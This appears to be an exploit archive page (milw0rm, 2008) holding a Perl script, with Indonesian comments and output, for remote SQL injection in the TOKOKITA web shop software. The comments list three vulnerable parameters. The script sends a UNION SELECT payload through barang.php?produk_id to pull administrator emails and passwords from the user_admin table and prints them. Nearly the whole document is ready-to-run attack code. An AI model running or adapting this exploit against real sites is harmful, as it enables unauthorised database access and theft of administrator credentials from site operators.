<html><head><title>TOKOKITA (barang.php produk_id) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# k1tk4t Public Security Advisory
# ////////////////////////////////////////////////////////////
# TOKOKITA Multiple Remote SQL Injection 
# Demosite	: http://www.tokokita.net/toko/
# Vendor	: http://www.tokokita.com/
# Kutu		: 1. catlist.php?cat_id=[Blind SQLi]
#		  2. catlist_detail.php?cat_id=[Blind SQLi]
#	          3. barang.php?produk_id=[SQLi]
# Terimakasih untuk ;
# str0ke,DNX,n0c0py,L41n,
# NTOS-Team-&gt;[fl3xu5,opt1lc,sakitjiwa],
# eCHo-&gt;[y3dips,K-159,lirva32,dan staff lainnya] 
use LWP::UserAgent;

if ( !$ARGV[1] ) {
	print &quot;\n //////////////////////////////////////////////////////////////////&quot;;
	print &quot;\n //                      ..::&gt; k1tk4t &lt;::..                      //&quot;;
	print &quot;\n // TOKOKITA (barang.php produk_id) Remote SQL Injection Exploit //&quot;;
	print &quot;\n //////////////////////////////////////////////////////////////////&quot;;
	print &quot;\n[!] &quot;;
	print &quot;\n[!] Penggunaan : perl tokokita.pl [Site] [Path]&quot;;
	print &quot;\n[!] Contoh     : perl tokokita.pl localhost /toko/&quot;;
	print &quot;\n[!] &quot;;
	print &quot;\n&quot;;
	exit;
}
$site   = $ARGV[0];
$path   = $ARGV[1];
$sqlinj = &quot;union+
select+
null,
null,
null,
concat(0x6b3174,email,0x316e),
null,
concat(0x6b3474,password,0x307574),
null,
null,
null,
null,
null+
from+
user_admin/*&quot;;    
$expl = &quot;http://&quot; . $site . $path . &quot;barang.php?produk_id=-9+&quot;
. $sqlinj;
$www  = new LWP::UserAgent;
print &quot;\n\n [!] Injeksi SQL \n&quot;;
$res = $www-&gt;get($expl) or err ();
$hasil = $res-&gt;content;
if ( $hasil =~ /k1t(.*?)1n/ ) {
	print &quot;\n [+] Username      : $1&quot;;
	$hasil =~ /k4t(.*?)0ut/, print &quot;\n [+] Password      : $1&quot;;
	print &quot;\n\n&quot;;
} 
else {
	print &quot;\n [-] Exploit gagal ;)&quot;;
	exit();
}

# milw0rm.com [2008-06-24]</pre></html>